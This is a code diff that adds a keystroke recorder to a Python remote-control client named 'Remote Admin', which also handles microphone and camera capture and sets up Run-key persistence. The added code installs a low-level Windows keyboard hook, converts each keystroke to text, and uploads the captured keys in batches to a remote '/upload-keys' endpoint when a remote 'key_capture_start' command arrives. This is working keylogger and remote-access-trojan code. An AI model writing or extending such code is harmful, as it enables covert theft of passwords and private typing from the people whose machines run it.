@@ -11,6 +11,7 @@ import socket
 import tempfile
 import subprocess
 import threading
+from collections import deque
 
 if os.name == "nt":
     import winreg
@@ -89,6 +90,10 @@ mic_stop_event = threading.Event()
 camera_lock = threading.Lock()
 camera_thread = None
 camera_stop_event = threading.Event()
+
+key_pending = deque(maxlen=2000)
+key_pending_lock = threading.Lock()
+key_capture_enabled = threading.Event()
 
 STARTUP_NAME = "Remote Admin"
 STARTUP_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -832,6 +837,268 @@ def handle_key_text(action):
             user32.keybd_event(0, code, KEYEVENTF_UNICODE | KEYEVENTF_KEYUP, 0)
     except Exception as error:
         print("[KEY] Text failed:", error, flush=True)
+
+
+# ==================================================
+# KEY RECORDING (SEE KEYS)
+# ==================================================
+
+KEY_LABELS = {
+    0x08: "Backspace",
+    0x09: "Tab",
+    0x0D: "Enter",
+    0x10: "Shift",
+    0x11: "Ctrl",
+    0x12: "Alt",
+    0x13: "Pause",
+    0x14: "Caps Lock",
+    0x1B: "Esc",
+    0x21: "Page Up",
+    0x22: "Page Down",
+    0x23: "End",
+    0x24: "Home",
+    0x25: "Left",
+    0x26: "Up",
+    0x27: "Right",
+    0x28: "Down",
+    0x2C: "Print Screen",
+    0x2D: "Insert",
+    0x2E: "Delete",
+    0x5B: "Win",
+    0x5C: "Win",
+    0x5D: "Menu",
+    0x90: "Num Lock",
+    0x91: "Scroll Lock",
+    0xA0: "Shift",
+    0xA1: "Shift",
+    0xA2: "Ctrl",
+    0xA3: "Ctrl",
+    0xA4: "Alt",
+    0xA5: "Alt",
+}
+
+KEY_LABELS.update({0x70 + number: f"F{number + 1}" for number in range(24)})
+
+KEY_MODIFIER_VKS = {0x10, 0x11, 0x12, 0x5B, 0x5C, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5}
+
+
+def _queue_key_event(kind, value):
+    if not value:
+        return
+    with key_pending_lock:
+        key_pending.append({"type": kind, "value": value})
+
+
+if os.name == "nt":
+
+    from ctypes import wintypes
+
+    WH_KEYBOARD_LL = 13
+    WM_KEYDOWN = 0x0100
+    WM_KEYUP = 0x0101
+    WM_SYSKEYDOWN = 0x0104
+    WM_SYSKEYUP = 0x0105
+
+    class KBDLLHOOKSTRUCT(ctypes.Structure):
+        _fields_ = [
+            ("vkCode", wintypes.DWORD),
+            ("scanCode", wintypes.DWORD),
+            ("flags", wintypes.DWORD),
+            ("time", wintypes.DWORD),
+            ("dwExtraInfo", ctypes.c_void_p),
+        ]
+
+    LOW_LEVEL_KEYBOARD_PROC = ctypes.WINFUNCTYPE(
+        ctypes.c_ssize_t,
+        ctypes.c_int,
+        wintypes.WPARAM,
+        wintypes.LPARAM
+    )
+
+    KEY_USER32 = ctypes.WinDLL("user32", use_last_error=True)
+    KEY_USER32.GetForegroundWindow.restype = ctypes.c_void_p
+    KEY_USER32.GetWindowThreadProcessId.restype = wintypes.DWORD
+    KEY_USER32.GetWindowThreadProcessId.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
+    KEY_USER32.GetKeyboardLayout.restype = ctypes.c_void_p
+    KEY_USER32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
+    KEY_USER32.GetKeyboardState.argtypes = [ctypes.POINTER(ctypes.c_ubyte)]
+    KEY_USER32.ToUnicodeEx.argtypes = [
+        wintypes.UINT,
+        wintypes.UINT,
+        ctypes.POINTER(ctypes.c_ubyte),
+        ctypes.c_wchar_p,
+        ctypes.c_int,
+        wintypes.UINT,
+        ctypes.c_void_p
+    ]
+    KEY_USER32.ToUnicodeEx.restype = ctypes.c_int
+    KEY_USER32.SetWindowsHookExW.restype = ctypes.c_void_p
+    KEY_USER32.SetWindowsHookExW.argtypes = [
+        ctypes.c_int,
+        LOW_LEVEL_KEYBOARD_PROC,
+        ctypes.c_void_p,
+        wintypes.DWORD
+    ]
+    KEY_USER32.CallNextHookEx.restype = ctypes.c_ssize_t
+    KEY_USER32.CallNextHookEx.argtypes = [
+        ctypes.c_void_p,
+        ctypes.c_int,
+        wintypes.WPARAM,
+        wintypes.LPARAM
+    ]
+    KEY_USER32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
+
+    key_hook_handle = None
+    key_hook_proc = None
+    key_held = set()
+
+    def _key_text(vk, scan):
+        try:
+            state = (ctypes.c_ubyte * 256)()
+            if not KEY_USER32.GetKeyboardState(state):
+                return ""
+            window = KEY_USER32.GetForegroundWindow()
+            thread = KEY_USER32.GetWindowThreadProcessId(window, None) if window else 0
+            layout = (
+                KEY_USER32.GetKeyboardLayout(thread)
+                if thread else KEY_USER32.GetKeyboardLayout(0)
+            )
+            buffer = ctypes.create_unicode_buffer(8)
+            count = KEY_USER32.ToUnicodeEx(vk, scan, state, buffer, 8, 4, layout)
+            if count <= 0:
+                return ""
+            return buffer.value[:count]
+        except Exception:
+            return ""
+
+    def _handle_key_down(info):
+        vk = int(info.vkCode)
+        scan = int(info.scanCode)
+
+        # Characters typed through the dashboard arrive as injected
+        # KEYEVENTF_UNICODE events: VK_PACKET with the character in scanCode.
+        if vk in (0, 0xE7):
+            if 0 < scan < 0x110000 and not 0xD800 <= scan <= 0xDFFF:
+                char = chr(scan)
+                if char.isprintable() or char in ("\t", "\n"):
+                    _queue_key_event("text", char)
+            return
+
+        repeated = vk in key_held
+        key_held.add(vk)
+
+        label = KEY_LABELS.get(vk)
+
+        if label:
+            if repeated and vk in KEY_MODIFIER_VKS:
+                return
+            _queue_key_event("special", label)
+            return
+
+        _queue_key_event("text", _key_text(vk, scan))
+
+    def _keyboard_hook(code, message, data):
+        try:
+            if code >= 0 and key_capture_enabled.is_set():
+                if message in (WM_KEYDOWN, WM_SYSKEYDOWN):
+                    _handle_key_down(
+                        ctypes.cast(data, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
+                    )
+                elif message in (WM_KEYUP, WM_SYSKEYUP):
+                    info = ctypes.cast(data, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
+                    key_held.discard(int(info.vkCode))
+        except Exception:
+            pass
+
+        return KEY_USER32.CallNextHookEx(key_hook_handle, code, message, data)
+
+    def key_capture_loop():
+        global key_hook_handle, key_hook_proc
+
+        key_hook_proc = LOW_LEVEL_KEYBOARD_PROC(_keyboard_hook)
+        key_hook_handle = KEY_USER32.SetWindowsHookExW(
+            WH_KEYBOARD_LL,
+            key_hook_proc,
+            None,
+            0
+        )
+
+        if not key_hook_handle:
+            print(
+                "[KEYS] Could not start recording:",
+                ctypes.get_last_error(),
+                flush=True
+            )
+            key_hook_proc = None
+            return
+
+        print("[KEYS] Keyboard recorder ready.", flush=True)
+
+        message = wintypes.MSG()
+
+        while not stop_event.is_set():
+            if KEY_USER32.PeekMessageW(ctypes.byref(message), None, 0, 0, 1):
+                KEY_USER32.TranslateMessage(ctypes.byref(message))
+                KEY_USER32.DispatchMessageW(ctypes.byref(message))
+            else:
+                time.sleep(0.01)
+
+        KEY_USER32.UnhookWindowsHookEx(key_hook_handle)
+        key_hook_handle = None
+        key_hook_proc = None
+
+        print("[KEYS] Keyboard recorder stopped.", flush=True)
+
+    def start_key_capture():
+        with key_pending_lock:
+            key_pending.clear()
+        key_held.clear()
+        key_capture_enabled.set()
+        print("[KEYS] Recording started.", flush=True)
+
+    def stop_key_capture():
+        key_capture_enabled.clear()
+        key_held.clear()
+        print("[KEYS] Recording stopped.", flush=True)
+
+else:
+
+    def key_capture_loop():
+        return
+
+    def start_key_capture():
+        return
+
+    def stop_key_capture():
+        return
+
+
+def key_upload_loop():
+    while not stop_event.is_set():
+        stop_event.wait(1)
+
+        if not key_capture_enabled.is_set() or not registered_event.is_set():
+            continue
+
+        with key_pending_lock:
+            if not key_pending:
+                continue
+            batch = [
+                key_pending.popleft()
+                for _ in range(min(len(key_pending), 200))
+            ]
+
+        try:
+            session.post(
+                WEBSITE + "/upload-keys",
+                json={"name": identity["name"], "events": batch},
+                timeout=20
+            ).raise_for_status()
+        except Exception as error:
+            print("[KEYS] Upload failed:", error, flush=True)
+            with key_pending_lock:
+                key_pending.extendleft(reversed(batch))
+            stop_event.wait(4)
 
 
 # ==================================================
@@ -2098,6 +2365,14 @@ def handle_action(action):
 
         handle_key_text(action)
 
+    elif action_type == "key_capture_start":
+
+        start_key_capture()
+
+    elif action_type == "key_capture_stop":
+
+        stop_key_capture()
+
     elif action_type == "mic_start":
 
         start_mic()
@@ -2227,10 +2502,22 @@ def main():
         daemon=False
     )
 
+    key_thread = threading.Thread(
+        target=key_capture_loop,
+        daemon=True
+    )
+
+    key_upload_thread = threading.Thread(
+        target=key_upload_loop,
+        daemon=True
+    )
+
     try:
 
         sync_thread.start()
         worker.start()
+        key_thread.start()
+        key_upload_thread.start()
 
         while worker.is_alive():
             worker.join(timeout=1)
